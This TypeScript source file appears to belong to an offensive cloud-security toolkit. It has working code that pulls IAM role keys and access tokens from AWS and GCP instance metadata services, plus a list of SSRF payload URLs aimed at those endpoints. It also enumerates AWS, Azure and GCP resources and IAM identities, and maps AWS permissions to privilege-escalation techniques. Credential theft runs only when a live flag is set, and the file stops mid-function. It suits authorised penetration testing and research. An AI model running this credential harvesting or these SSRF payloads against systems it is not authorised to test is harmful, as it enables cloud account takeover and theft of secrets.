/**
 * Cloud attack-surface modules (port of `modules.cloud`).
 *
 * - Metadata exploit — probes cloud metadata services (169.254.169.254) for
 *   instance metadata and credentials (T1552.005). Live probes only happen
 *   when `live=true`; otherwise returns the harmless capability report.
 * - Reconnaissance — AWS/Azure/GCP enumeration via the cloud CLIs.
 * - IAM enumeration + privilege-escalation analysis across all three clouds.
 */

import { resolveDryRun } from "./exec_options.ts"
import { execFile } from "node:child_process";
import { promisify } from "node:util";

const execFileP = promisify(execFile);

async function runCli(cmd: string, args: string[], timeoutMs = 60_000): Promise<Record<string, unknown> | unknown[]> {
  try {
    const { stdout } = await execFileP(cmd, args, { timeout: timeoutMs });
    if (!stdout.trim()) return {};
    return JSON.parse(stdout) as Record<string, unknown> | unknown[];
  } catch (err) {
    const message = err instanceof Error ? err.message : String(err);
    return { error: message.slice(-2000) };
  }
}

async function httpGet(url: string, headers: Record<string, string> = {}, timeoutMs = 5000): Promise<{ ok: boolean; text: string }> {
  try {
    const resp = await fetch(url, { headers, signal: AbortSignal.timeout(timeoutMs) });
    return { ok: resp.ok, text: await resp.text() };
  } catch {
    return { ok: false, text: "" };
  }
}

// ------------------------------------------------------------------------- //
// Metadata service exploitation (T1552.005)
// ------------------------------------------------------------------------- //

export interface MetadataResult {
  cloud_provider: string;
  endpoint: string;
  accessible: boolean;
  data: Record<string, unknown>;
  credentials: Array<Record<string, unknown>>;
  error: string;
}

export const METADATA_ENDPOINTS = {
  aws: {
    base: "http://169.254.169.254/latest/meta-data",
    iam: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    user_data: "http://169.254.169.254/latest/user-data",
    identity: "http://169.254.169.254/latest/dynamic/instance-identity/document",
  },
  azure: {
    base: "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    identity: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01",
  },
  gcp: {
    base: "http://169.254.169.254/computeMetadata/v1/",
    token: "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
  },
};

export class MetadataExploit {
  live: boolean;

  constructor(opts: { live?: boolean } = {}) {
    this.live = opts.live ?? false;
  }

  async exploitAws(): Promise<MetadataResult> {
    const result: MetadataResult = {
      cloud_provider: "aws",
      endpoint: METADATA_ENDPOINTS.aws.base,
      accessible: false,
      data: {},
      credentials: [],
      error: "",
    };
    if (!this.live) {
      result.error = "dry-run: metadata probe skipped (set live=true on an authorized host)";
      return result;
    }
    const probe = await httpGet(METADATA_ENDPOINTS.aws.base);
    if (!probe.ok || !probe.text.trim()) return result;
    result.accessible = true;
    result.data = { meta_data: probe.text.slice(0, 2000) };
    const iam = await httpGet(METADATA_ENDPOINTS.aws.iam);
    if (iam.ok && iam.text.trim()) {
      const roleName = iam.text.trim();
      const creds = await httpGet(`${METADATA_ENDPOINTS.aws.iam}${roleName}`);
      if (creds.ok) {
        try {
          const parsed = JSON.parse(creds.text) as Record<string, unknown>;
          result.credentials.push({
            type: "iam_role",
            role: roleName,
            access_key: String(parsed["AccessKeyId"] ?? ""),
            secret_key: String(parsed["SecretAccessKey"] ?? ""),
            token: String(parsed["Token"] ?? ""),
            expiration: String(parsed["Expiration"] ?? ""),
          });
        } catch {
          // non-JSON body — skip
        }
      }
    }
    return result;
  }

  async exploitAzure(): Promise<MetadataResult> {
    const result: MetadataResult = {
      cloud_provider: "azure",
      endpoint: METADATA_ENDPOINTS.azure.base,
      accessible: false,
      data: {},
      credentials: [],
      error: "",
    };
    if (!this.live) {
      result.error = "dry-run: metadata probe skipped (set live=true on an authorized host)";
      return result;
    }
    const probe = await httpGet(METADATA_ENDPOINTS.azure.base, { Metadata: "true" });
    if (!probe.ok || !probe.text.trim()) return result;
    result.accessible = true;
    try {
      result.data = JSON.parse(probe.text) as Record<string, unknown>;
    } catch {
      result.data = { raw: probe.text.slice(0, 2000) };
    }
    return result;
  }

  async exploitGcp(): Promise<MetadataResult> {
    const result: MetadataResult = {
      cloud_provider: "gcp",
      endpoint: METADATA_ENDPOINTS.gcp.base,
      accessible: false,
      data: {},
      credentials: [],
      error: "",
    };
    if (!this.live) {
      result.error = "dry-run: metadata probe skipped (set live=true on an authorized host)";
      return result;
    }
    const probe = await httpGet(METADATA_ENDPOINTS.gcp.base, { "Metadata-Flavor": "Google" });
    if (!probe.ok || !probe.text.trim()) return result;
    result.accessible = true;
    result.data = { project_id: probe.text.trim().slice(0, 500) };
    const token = await httpGet(METADATA_ENDPOINTS.gcp.token, { "Metadata-Flavor": "Google" });
    if (token.ok) {
      try {
        const parsed = JSON.parse(token.text) as Record<string, unknown>;
        result.credentials.push({
          type: "access_token",
          token: String(parsed["access_token"] ?? ""),
          token_type: String(parsed["token_type"] ?? ""),
          expires_in: Number(parsed["expires_in"] ?? 0),
        });
      } catch {
        // skip
      }
    }
    return result;
  }

  async exploitAll(): Promise<MetadataResult[]> {
    return [await this.exploitAws(), await this.exploitAzure(), await this.exploitGcp()];
  }

  getSsrfPayloads(): string[] {
    return [
      "http://169.254.169.254/latest/meta-data/",
      "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      "http://169.254.169.254/latest/user-data",
      "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
      "http://169.254.169.254/computeMetadata/v1/",
      "http://metadata.google.internal/computeMetadata/v1/",
      "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01",
    ];
  }

  probe(): Record<string, unknown> {
    return {
      kind: "cloud-metadata",
      technique_id: "T1552.005",
      technique: "Cloud Instance Metadata API",
      live: this.live,
      ssrf_payloads: this.getSsrfPayloads().length,
      note: "set live=true on an authorized cloud host to probe metadata endpoints",
    };
  }
}

// ------------------------------------------------------------------------- //
// AWS recon
// ------------------------------------------------------------------------- //

export class AWSRecon {
  profile: string;
  region: string;

  constructor(opts: { profile?: string; region?: string } = {}) {
    this.profile = opts.profile ?? "default";
    this.region = opts.region ?? "us-east-1";
  }

  private async runAws(service: string, command: string, args: string[] = [], region = ""): Promise<Record<string, unknown> | unknown[]> {
    const cmd = [
      service, command, "--profile", this.profile, "--region", region || this.region, "--output", "json", ...args,
    ];
    return runCli("aws", cmd);
  }

  async enumerateAll(): Promise<Record<string, unknown>> {
    return {
      identity: await this.getIdentity(),
      ec2: await this.listEc2(),
      s3: await this.listS3(),
      iam_users: await this.listIamUsers(),
      iam_roles: await this.listIamRoles(),
      lambda: await this.listLambda(),
      rds: await this.listRds(),
      secrets_manager: await this.listSecrets(),
      cloudtrail: await this.listCloudtrail(),
      vpc: await this.listVpcs(),
      security_groups: await this.listSecurityGroups(),
    };
  }

  async getIdentity(): Promise<Record<string, unknown> | unknown[]> {
    return this.runAws("sts", "get-caller-identity");
  }

  async listEc2(region = ""): Promise<unknown[]> {
    const data = (await this.runAws("ec2", "describe-instances", [], region)) as Record<string, unknown>;
    const reservations = Array.isArray(data["Reservations"]) ? (data["Reservations"] as unknown[]) : [];
    const instances: unknown[] = [];
    for (const reservation of reservations) {
      const res = reservation as Record<string, unknown>;
      for (const instance of Array.isArray(res["Instances"]) ? (res["Instances"] as unknown[]) : []) {
        const inst = instance as Record<string, unknown>;
        instances.push({
          id: String(inst["InstanceId"] ?? ""),
          type: String(inst["InstanceType"] ?? ""),
          state: String((inst["State"] as Record<string, unknown>)?.["Name"] ?? ""),
          private_ip: String(inst["PrivateIpAddress"] ?? ""),
          public_ip: String(inst["PublicIpAddress"] ?? ""),
          vpc_id: String(inst["VpcId"] ?? ""),
          subnet_id: String(inst["SubnetId"] ?? ""),
          security_groups: (inst["SecurityGroups"] as unknown[] ?? []).map((sg) => String((sg as Record<string, unknown>)["GroupId"] ?? "")),
          tags: Object.fromEntries((inst["Tags"] as unknown[] ?? []).map((t) => {
            const tag = t as Record<string, unknown>;
            return [String(tag["Key"] ?? ""), String(tag["Value"] ?? "")];
          })),
          iam_profile: String((inst["IamInstanceProfile"] as Record<string, unknown>)?.["Arn"] ?? ""),
        });
      }
    }
    return instances;
  }

  async listS3(): Promise<unknown[]> {
    const data = (await this.runAws("s3api", "list-buckets")) as Record<string, unknown>;
    const buckets: unknown[] = [];
    for (const bucket of Array.isArray(data["Buckets"]) ? (data["Buckets"] as unknown[]) : []) {
      const b = bucket as Record<string, unknown>;
      const name = String(b["Name"] ?? "");
      const regionData = (await this.runAws("s3api", "get-bucket-location", ["--bucket", name])) as Record<string, unknown>;
      buckets.push({
        name,
        creation_date: String(b["CreationDate"] ?? ""),
        region: String(regionData["LocationConstraint"] ?? "us-east-1"),
      });
    }
    return buckets;
  }

  async listIamUsers(): Promise<unknown[]> {
    const data = (await this.runAws("iam", "list-users")) as Record<string, unknown>;
    const users: unknown[] = [];
    for (const user of Array.isArray(data["Users"]) ? (data["Users"] as unknown[]) : []) {
      const u = user as Record<string, unknown>;
      const name = String(u["UserName"] ?? "");
      const policies = (await this.runAws("iam", "list-attached-user-policies", ["--user-name", name])) as Record<string, unknown>;
      const groups = (await this.runAws("iam", "list-groups-for-user", ["--user-name", name])) as Record<string, unknown>;
      users.push({
        name,
        arn: String(u["Arn"] ?? ""),
        created: String(u["CreateDate"] ?? ""),
        policies: (policies["AttachedPolicies"] as unknown[] ?? []).map((p) => String((p as Record<string, unknown>)["PolicyName"] ?? "")),
        groups: (groups["Groups"] as unknown[] ?? []).map((g) => String((g as Record<string, unknown>)["GroupName"] ?? "")),
      });
    }
    return users;
  }

  async listIamRoles(): Promise<unknown[]> {
    const data = (await this.runAws("iam", "list-roles")) as Record<string, unknown>;
    const roles: unknown[] = [];
    for (const role of Array.isArray(data["Roles"]) ? (data["Roles"] as unknown[]) : []) {
      const r = role as Record<string, unknown>;
      roles.push({
        name: String(r["RoleName"] ?? ""),
        arn: String(r["Arn"] ?? ""),
        created: String(r["CreateDate"] ?? ""),
        max_session: Number(r["MaxSessionDuration"] ?? 3600),
        trust_principals: extractTrustPrincipals((r["AssumeRolePolicyDocument"] as Record<string, unknown>) ?? {}),
      });
    }
    return roles;
  }

  async listLambda(): Promise<unknown[]> {
    const data = (await this.runAws("lambda", "list-functions")) as Record<string, unknown>;
    return (data["Functions"] as unknown[] ?? []).map((fn) => {
      const f = fn as Record<string, unknown>;
      return {
        name: String(f["FunctionName"] ?? ""),
        arn: String(f["FunctionArn"] ?? ""),
        runtime: String(f["Runtime"] ?? ""),
        role: String(f["Role"] ?? ""),
        handler: String(f["Handler"] ?? ""),
        size: Number(f["CodeSize"] ?? 0),
        timeout: Number(f["Timeout"] ?? 0),
        vpc_id: String((f["VpcConfig"] as Record<string, unknown>)?.["VpcId"] ?? ""),
      };
    });
  }

  async listRds(): Promise<unknown[]> {
    const data = (await this.runAws("rds", "describe-db-instances")) as Record<string, unknown>;
    return (data["DBInstances"] as unknown[] ?? []).map((db) => {
      const d = db as Record<string, unknown>;
      const endpoint = (d["Endpoint"] as Record<string, unknown>) ?? {};
      return {
        id: String(d["DBInstanceIdentifier"] ?? ""),
        engine: String(d["Engine"] ?? ""),
        status: String(d["DBInstanceStatus"] ?? ""),
        endpoint: String(endpoint["Address"] ?? ""),
        port: Number(endpoint["Port"] ?? 0),
        vpc_id: String((d["DBSubnetGroup"] as Record<string, unknown>)?.["VpcId"] ?? ""),
        publicly_accessible: Boolean(d["PubliclyAccessible"] ?? false),
      };
    });
  }

  async listSecrets(): Promise<unknown[]> {
    const data = (await this.runAws("secretsmanager", "list-secrets")) as Record<string, unknown>;
    return (data["SecretList"] as unknown[] ?? []).map((s) => {
      const secret = s as Record<string, unknown>;
      return {
        name: String(secret["Name"] ?? ""),
        arn: String(secret["ARN"] ?? ""),
        created: String(secret["CreatedDate"] ?? ""),
        description: String(secret["Description"] ?? ""),
      };
    });
  }

  async listCloudtrail(): Promise<unknown[]> {
    const data = (await this.runAws("cloudtrail", "describe-trails")) as Record<string, unknown>;
    return (data["trailList"] as unknown[] ?? []).map((t) => {
      const trail = t as Record<string, unknown>;
      return {
        name: String(trail["Name"] ?? ""),
        s3_bucket: String(trail["S3BucketName"] ?? ""),
        region: String(trail["HomeRegion"] ?? ""),
        is_logging: Boolean(trail["IsLogging"] ?? false),
      };
    });
  }

  async listVpcs(): Promise<unknown[]> {
    const data = (await this.runAws("ec2", "describe-vpcs")) as Record<string, unknown>;
    return (data["Vpcs"] as unknown[] ?? []).map((v) => {
      const vpc = v as Record<string, unknown>;
      return {
        id: String(vpc["VpcId"] ?? ""),
        cidr: String(vpc["CidrBlock"] ?? ""),
        is_default: Boolean(vpc["IsDefault"] ?? false),
        state: String(vpc["State"] ?? ""),
        tags: Object.fromEntries((vpc["Tags"] as unknown[] ?? []).map((t) => {
          const tag = t as Record<string, unknown>;
          return [String(tag["Key"] ?? ""), String(tag["Value"] ?? "")];
        })),
      };
    });
  }

  async listSecurityGroups(): Promise<unknown[]> {
    const data = (await this.runAws("ec2", "describe-security-groups")) as Record<string, unknown>;
    return (data["SecurityGroups"] as unknown[] ?? []).map((sg) => {
      const g = sg as Record<string, unknown>;
      return {
        id: String(g["GroupId"] ?? ""),
        name: String(g["GroupName"] ?? ""),
        vpc_id: String(g["VpcId"] ?? ""),
        inbound_rules: (g["IpPermissions"] as unknown[]) ?? [],
        outbound_rules: (g["IpPermissionsEgress"] as unknown[]) ?? [],
      };
    });
  }

  async checkPermissions(): Promise<Record<string, unknown>> {
    const identity = (await this.getIdentity()) as Record<string, unknown>;
    const data = (await this.runAws("iam", "simulate-principal-policy", [
      "--policy-source-arn", String(identity["Arn"] ?? ""),
      "--action-names", "s3:GetObject", "ec2:DescribeInstances", "iam:GetUsers",
    ])) as Record<string, unknown>;
    return { evaluations: data["EvaluationResults"] ?? [] };
  }
}

function extractTrustPrincipals(policyDoc: Record<string, unknown>): string[] {
  const principals: string[] = [];
  for (const stmt of Array.isArray(policyDoc["Statement"]) ? (policyDoc["Statement"] as unknown[]) : []) {
    const principal = (stmt as Record<string, unknown>)["Principal"] as Record<string, unknown> | undefined;
    if (principal && typeof principal === "object") {
      const aws = principal["AWS"];
      if (Array.isArray(aws)) principals.push(...aws.map(String));
      else if (typeof aws === "string") principals.push(aws);
    }
  }
  return principals;
}

// ------------------------------------------------------------------------- //
// Azure recon
// ------------------------------------------------------------------------- //

export class AzureRecon {
  subscription: string;

  constructor(opts: { subscription?: string } = {}) {
    this.subscription = opts.subscription ?? "";
  }

  private async runAz(command: string, args: string[] = []): Promise<Record<string, unknown> | unknown[]> {
    const cmd = ["az", command, "--output", "json"];
    if (this.subscription) cmd.push("--subscription", this.subscription);
    cmd.push(...args);
    return runCli("az", cmd);
  }

  async enumerateAll(): Promise<Record<string, unknown>> {
    return {
      account: await this.getAccountInfo(),
      vms: await this.listVms(),
      storage: await this.listStorageAccounts(),
      users: await this.listUsers(),
      roles: await this.listRoles(),
      nsgs: await this.listNsgs(),
      vnets: await this.listVnets(),
      key_vaults: await this.listKeyVaults(),
      managed_identities: await this.listManagedIdentities(),
    };
  }

  async getAccountInfo(): Promise<Record<string, unknown>> {
    const data = (await this.runAz("account", ["show"])) as Record<string, unknown>;
    return {
      id: String(data["id"] ?? ""),
      name: String(data["name"] ?? ""),
      state: String(data["state"] ?? ""),
      user: (data["user"] as Record<string, unknown>) ?? {},
    };
  }

  async listVms(): Promise<unknown[]> {
    const data = await this.runAz("vm", ["list", "--show-details"]);
    return (Array.isArray(data) ? data : []).map((vm) => {
      const v = vm as Record<string, unknown>;
      return {
        name: String(v["name"] ?? ""),
        resource_group: String(v["resourceGroup"] ?? ""),
        location: String(v["location"] ?? ""),
        os_type: String((v["osProfile"] as Record<string, unknown>)?.["computerName"] ?? ""),
        private_ip: String(v["privateIps"] ?? ""),
        public_ip: String(v["publicIps"] ?? ""),
        nics: (v["networkProfile"] as Record<string, unknown>)?.["networkInterfaces"] ?? [],
        identity: (v["identity"] as Record<string, unknown>) ?? {},
      };
    });
  }

  async listStorageAccounts(): Promise<unknown[]> {
    const data = await this.runAz("storage", ["account", "list"]);
    return (Array.isArray(data) ? data : []).map((acc) => {
      const a = acc as Record<string, unknown>;
      return {
        name: String(a["name"] ?? ""),
        resource_group: String(a["resourceGroup"] ?? ""),
        location: String(a["location"] ?? ""),
        kind: String(a["kind"] ?? ""),
        sku: String((a["sku"] as Record<string, unknown>)?.["name"] ?? ""),
        https_only: Boolean(a["enableHttpsTrafficOnly"] ?? false),
        blob_endpoint: String((a["primaryEndpoints"] as Record<string, unknown>)?.["blob"] ?? ""),
      };
    });
  }

  async listUsers(): Promise<unknown[]> {
    const data = await this.runAz("ad", ["user", "list"]);
    return (Array.isArray(data) ? data : []).map((user) => {
      const u = user as Record<string, unknown>;
      return {
        display_name: String(u["displayName"] ?? ""),
        user_principal_name: String(u["userPrincipalName"] ?? ""),
        object_id: String(u["objectId"] ?? ""),
        mail: String(u["mail"] ?? ""),
      };
    });
  }

  async listRoles(): Promise<unknown[]> {
    const data = await this.runAz("role", ["assignment", "list", "--include-inherited"]);
    return (Array.isArray(data) ? data : []).map((assignment) => {
      const a = assignment as Record<string, unknown>;
      return {
        principal: String(a["principalName"] ?? ""),
        role: String(a["roleDefinitionName"] ?? ""),
        scope: String(a["scope"] ?? ""),
        principal_type: String(a["principalType"] ?? ""),
      };
    });
  }

  async listNsgs(): Promise<unknown[]> {
    const data = await this.runAz("network", ["nsg", "list"]);
    return (Array.isArray(data) ? data : []).map((nsg) => {
      const n = nsg as Record<string, unknown>;
      return {
        name: String(n["name"] ?? ""),
        resource_group: String(n["resourceGroup"] ?? ""),
        rules: (n["securityRules"] as unknown[]) ?? [],
      };
    });
  }

  async listVnets(): Promise<unknown[]> {
    const data = await this.runAz("network", ["vnet", "list"]);
    return (Array.isArray(data) ? data : []).map((vnet) => {
      const v = vnet as Record<string, unknown>;
      const addressSpace = (v["addressSpace"] as Record<string, unknown>) ?? {};
      return {
        name: String(v["name"] ?? ""),
        resource_group: String(v["resourceGroup"] ?? ""),
        address_space: (addressSpace["addressPrefixes"] as unknown[]) ?? [],
        subnets: ((v["subnets"] as unknown[]) ?? []).map((s) => {
          const subnet = s as Record<string, unknown>;
          return { name: String(subnet["name"] ?? ""), cidr: String(subnet["addressPrefix"] ?? "") };
        }),
      };
    });
  }

  async listKeyVaults(): Promise<unknown[]> {
    const data = await this.runAz("keyvault", ["list"]);
    return (Array.isArray(data) ? data : []).map((vault) => {
      const v = vault as Record<string, unknown>;
      return {
        name: String(v["name"] ?? ""),
        resource_group: String(v["resourceGroup"] ?? ""),
        vault_uri: String(v["vaultUri"] ?? ""),
      };
    });
  }

  async listManagedIdentities(): Promise<unknown[]> {
    const data = await this.runAz("identity", ["list"]);
    return (Array.isArray(data) ? data : []).map((identity) => {
      const i = identity as Record<string, unknown>;
      return {
        name: String(i["name"] ?? ""),
        resource_group: String(i["resourceGroup"] ?? ""),
        client_id: String(i["clientId"] ?? ""),
        principal_id: String(i["principalId"] ?? ""),
      };
    });
  }

  async checkPermissions(): Promise<Record<string, unknown>> {
    const account = (await this.getAccountInfo()) as Record<string, unknown>;
    const user = (account["user"] as Record<string, unknown>) ?? {};
    const data = await this.runAz("role", ["assignment", "list", "--assignee", String(user["id"] ?? "")]);
    return { assignments: Array.isArray(data) ? data : [] };
  }
}

// ------------------------------------------------------------------------- //
// GCP recon
// ------------------------------------------------------------------------- //

export class GCPRecon {
  project: string;
  zone: string;

  constructor(opts: { project?: string; zone?: string } = {}) {
    this.project = opts.project ?? "";
    this.zone = opts.zone ?? "us-central1-a";
  }

  private async runGcloud(command: string, args: string[] = []): Promise<Record<string, unknown> | unknown[]> {
    const cmd = ["gcloud", ...command.split(" "), "--format", "json"];
    if (this.project) cmd.push("--project", this.project);
    cmd.push(...args);
    return runCli("gcloud", cmd);
  }

  async enumerateAll(): Promise<Record<string, unknown>> {
    return {
      project: await this.getProjectInfo(),
      instances: await this.listInstances(),
      buckets: await this.listBuckets(),
      iam_members: await this.listIamMembers(),
      service_accounts: await this.listServiceAccounts(),
      networks: await this.listNetworks(),
      firewall_rules: await this.listFirewallRules(),
      sql_instances: await this.listSqlInstances(),
      functions: await this.listFunctions(),
    };
  }

  async getProjectInfo(): Promise<Record<string, unknown>> {
    const data = (await this.runGcloud("projects describe", this.project ? [this.project] : [])) as Record<string, unknown>;
    return {
      project_id: String(data["projectId"] ?? ""),
      name: String(data["name"] ?? ""),
      number: String(data["projectNumber"] ?? ""),
      lifecycle_state: String(data["lifecycleState"] ?? ""),
    };
  }

  async listInstances(): Promise<unknown[]> {
    const data = await this.runGcloud("compute instances list");
    return (Array.isArray(data) ? data : []).map((inst) => {
      const i = inst as Record<string, unknown>;
      return {
        name: String(i["name"] ?? ""),
        zone: String(i["zone"] ?? "").split("/").pop(),
        machine_type: String(i["machineType"] ?? "").split("/").pop(),
        status: String(i["status"] ?? ""),
        network_interfaces: ((i["networkInterfaces"] as unknown[]) ?? []).map((ni) => {
          const n = ni as Record<string, unknown>;
          return {
            name: String(n["name"] ?? ""),
            ip: String(n["networkIP"] ?? ""),
            access_configs: (n["accessConfigs"] as unknown[]) ?? [],
          };
        }),
        service_accounts: (i["serviceAccounts"] as unknown[]) ?? [],
        labels: (i["labels"] as Record<string, unknown>) ?? {},
      };
    });
  }

  async listBuckets(): Promise<unknown[]> {
    try {
      const args = this.project ? ["ls", "-L", "-p", this.project] : ["ls", "-L"];
      const { stdout } = await execFileP("gsutil", args, { timeout: 60_000 });
      const buckets: unknown[] = [];
      for (const line of stdout.split("\n")) {
        if (line.includes("gs://")) buckets.push({ name: line.trim() });
      }
      return buckets;
    } catch {
      return [];
    }
  }

  async listIamMembers(): Promise<unknown[]> {
    const data = (await this.runGcloud("projects get-iam-policy", this.project ? [this.project] : [])) as Record<string, unknown>;
    const members: unknown[] = [];
    for (const binding of Array.isArray(data["bindings"]) ? (data["bindings"] as unknown[]) : []) {
      const b = binding as Record<string, unknown>;
      const role = String(b["role"] ?? "");
      for (const member of Array.isArray(b["members"]) ? (b["members"] as unknown[]) : []) {
        members.push({ role, member: String(member) });
      }
    }
    return members;
  }

  async listServiceAccounts(): Promise<unknown[]> {
    const data = await this.runGcloud("iam service-accounts list");
    return (Array.isArray(data) ? data : []).map((sa) => {
      const s = sa as Record<string, unknown>;
      return {
        email: String(s["email"] ?? ""),
        name: String(s["displayName"] ?? ""),
        project_id: String(s["projectId"] ?? ""),
      };
    });
  }

  async listNetworks(): Promise<unknown[]> {
    const data = await this.runGcloud("compute networks list");
    return (Array.isArray(data) ? data : []).map((net) => {
      const n = net as Record<string, unknown>;
      return {
        name: String(n["name"] ?? ""),
        subnet_mode: String(n["subnetMode"] ?? ""),
        auto_subnets: Boolean(n["autoCreateSubnetworks"] ?? false),
        routing_config: (n["routingConfig"] as Record<string, unknown>) ?? {},
      };
    });
  }

  async listFirewallRules(): Promise<unknown[]> {
    const data = await this.runGcloud("compute firewall-rules list");
    return (Array.isArray(data) ? data : []).map((rule) => {
      const r = rule as Record<string, unknown>;
      return {
        name: String(r["name"] ?? ""),
        network: String(r["network"] ?? "").split("/").pop(),
        direction: String(r["direction"] ?? ""),
        priority: Number(r["priority"] ?? 1000),
        allowed: (r["allowed"] as unknown[]) ?? [],
        denied: (r["denied"] as unknown[]) ?? [],
        source_ranges: (r["sourceRanges"] as unknown[]) ?? [],
        target_tags: (r["targetTags"] as unknown[]) ?? [],
      };
    });
  }

  async listSqlInstances(): Promise<unknown[]> {
    const data = await this.runGcloud("sql instances list");
    return (Array.isArray(data) ? data : []).map((inst) => {
      const i = inst as Record<string, unknown>;
      return {
        name: String(i["name"] ?? ""),
        database_version: String(i["databaseVersion"] ?? ""),
        state: String(i["state"] ?? ""),
        ip_addresses: (i["ipAddresses"] as unknown[]) ?? [],
        region: String(i["region"] ?? ""),
      };
    });
  }

  async listFunctions(): Promise<unknown[]> {
    const data = await this.runGcloud("functions list");
    return (Array.isArray(data) ? data : []).map((fn) => {
      const f = fn as Record<string, unknown>;
      return {
        name: String(f["name"] ?? ""),
        status: String(f["status"] ?? ""),
        runtime: String(f["runtime"] ?? ""),
        trigger: (f["eventTrigger"] as Record<string, unknown>) ?? {},
        entry_point: String(f["entryPoint"] ?? ""),
      };
    });
  }
}

// ------------------------------------------------------------------------- //
// IAM enumeration
// ------------------------------------------------------------------------- //

export interface IAMIdentity {
  name: string;
  identity_type: string;
  cloud_provider: string;
  roles: string[];
  policies: string[];
  metadata: Record<string, unknown>;
}

export class IAMEnumerator {
  async enumerateAws(profile = "default"): Promise<IAMIdentity[]> {
    const aws = new AWSRecon({ profile });
    const identities: IAMIdentity[] = [];
    for (const user of (await aws.listIamUsers()) as Array<Record<string, unknown>>) {
      identities.push({
        name: String(user["name"] ?? ""),
        identity_type: "user",
        cloud_provider: "aws",
        roles: (user["groups"] as string[]) ?? [],
        policies: (user["policies"] as string[]) ?? [],
        metadata: { arn: String(user["arn"] ?? "") },
      });
    }
    for (const role of (await aws.listIamRoles()) as Array<Record<string, unknown>>) {
      identities.push({
        name: String(role["name"] ?? ""),
        identity_type: "role",
        cloud_provider: "aws",
        roles: [],
        policies: [],
        metadata: {
          arn: String(role["arn"] ?? ""),
          trust_principals: (role["trust_principals"] as unknown[]) ?? [],
        },
      });
    }
    return identities;
  }

  async enumerateAzure(subscription = ""): Promise<IAMIdentity[]> {
    const azure = new AzureRecon({ subscription });
    const identities: IAMIdentity[] = [];
    for (const user of (await azure.listUsers()) as Array<Record<string, unknown>>) {
      identities.push({
        name: String(user["display_name"] ?? ""),
        identity_type: "user",
        cloud_provider: "azure",
        roles: [],
        policies: [],
        metadata: {
          upn: String(user["user_principal_name"] ?? ""),
          object_id: String(user["object_id"] ?? ""),
        },
      });
    }
    for (const assignment of (await azure.listRoles()) as Array<Record<string, unknown>>) {
      identities.push({
        name: String(assignment["principal"] ?? ""),
        identity_type: "assignment",
        cloud_provider: "azure",
        roles: [String(assignment["role"] ?? "")],
        policies: [],
        metadata: { scope: String(assignment["scope"] ?? "") },
      });
    }
    return identities;
  }

  async enumerateGcp(project = ""): Promise<IAMIdentity[]> {
    const gcp = new GCPRecon({ project });
    const identities: IAMIdentity[] = [];
    for (const sa of (await gcp.listServiceAccounts()) as Array<Record<string, unknown>>) {
      identities.push({
        name: String(sa["email"] ?? ""),
        identity_type: "service_account",
        cloud_provider: "gcp",
        roles: [],
        policies: [],
        metadata: { project_id: String(sa["project_id"] ?? "") },
      });
    }
    for (const member of (await gcp.listIamMembers()) as Array<Record<string, unknown>>) {
      identities.push({
        name: String(member["member"] ?? ""),
        identity_type: "member",
        cloud_provider: "gcp",
        roles: [String(member["role"] ?? "")],
        policies: [],
        metadata: {},
      });
    }
    return identities;
  }

  async enumerateAll(opts: { awsProfile?: string; azureSub?: string; gcpProject?: string } = {}): Promise<IAMIdentity[]> {
    const identities: IAMIdentity[] = [];
    try {
      identities.push(...(await this.enumerateAws(opts.awsProfile ?? "default")));
    } catch {
      // skip unavailable cloud
    }
    try {
      identities.push(...(await this.enumerateAzure(opts.azureSub ?? "")));
    } catch {
      // skip
    }
    try {
      identities.push(...(await this.enumerateGcp(opts.gcpProject ?? "")));
    } catch {
      // skip
    }
    return identities;
  }

  findPrivileged(identities: IAMIdentity[]): IAMIdentity[] {
    const privilegedRoles = new Set([
      "AdministratorAccess", "Owner", "Contributor", "roles/owner",
      "roles/editor", "admin", "PowerUser", "IAMFullAccess",
    ]);
    return identities.filter((i) =>
      i.roles.some((r) => privilegedRoles.has(r) || r.toLowerCase().includes("admin")),
    );
  }

  findOverprivileged(identities: IAMIdentity[]): Array<Record<string, unknown>> {
    const findings: Array<Record<string, unknown>> = [];
    for (const identity of identities) {
      if (identity.roles.length > 5) {
        findings.push({
          identity: identity.name,
          reason: `Has ${identity.roles.length} roles assigned`,
          roles: identity.roles,
        });
      }
      for (const role of identity.roles) {
        if (role.toLowerCase().includes("admin") || role.toLowerCase().includes("owner")) {
          findings.push({
            identity: identity.name,
            reason: `Has privileged role: ${role}`,
            role,
          });
        }
      }
    }
    return findings;
  }
}

// ------------------------------------------------------------------------- //
// Cloud privilege escalation analysis
// ------------------------------------------------------------------------- //

export interface PrivEscPath {
  technique: string;
  description: string;
  cloud_provider: string;
  required_permissions: string[];
  target_role: string;
  mitre_id: string;
  risk_level: string;
}

function makePrivEscPath(
  technique: string,
  description: string,
  cloudProvider: string,
  opts: { targetRole?: string; mitreId?: string } = {},
): PrivEscPath {
  return {
    technique,
    description,
    cloud_provider: cloudProvider,
    required_permissions: [],
    target_role: opts.targetRole ?? "",
    mitre_id: opts.mitreId ?? "",
    risk_level: "high",
  };
}

const AWS_ACTION_MAP: Record<string, PrivEscPath> = {
  "iam:CreatePolicy": makePrivEscPath("CreatePolicy", "Create custom policy with admin access", "aws", { mitreId: "T1098.003" }),
  "iam:AttachUserPolicy": makePrivEscPath("AttachUserPolicy", "Attach admin policy to user", "aws", { mitreId: "T1098.001" }),
  "iam:AttachRolePolicy": makePrivEscPath("AttachRolePolicy", "Attach admin policy to role", "aws", { mitreId: "T1098.001" }),
  "iam:PutRolePolicy": makePrivEscPath("PutRolePolicy", "Inline admin policy on role", "aws", { mitreId: "T1098.001" }),
  "iam:CreateAccessKey": makePrivEscPath("CreateAccessKey", "Create access key for other user", "aws", { mitreId: "T1098.001" }),
  "sts:AssumeRole": makePrivEscPath("AssumeRole", "Assume higher-privileged role", "aws", { mitreId: "T1078.004" }),
  "iam:CreateLoginProfile": makePrivEscPath("CreateLoginProfile", "Set password for user without one", "aws", { mitreId: "T1098.001" }),
  "iam:UpdateLoginProfile": makePrivEscPath("UpdateLoginProfile", "Change user password", "aws", { mitreId: "T1098.001" }),
};

export class CloudPrivEsc {
  async analyzeAws(profile = "default"): Promise<PrivEscPath[]> {
    const arn = await this.getAwsArn(profile);
    if (!arn) return [];
    const data = (await runCli("aws", [
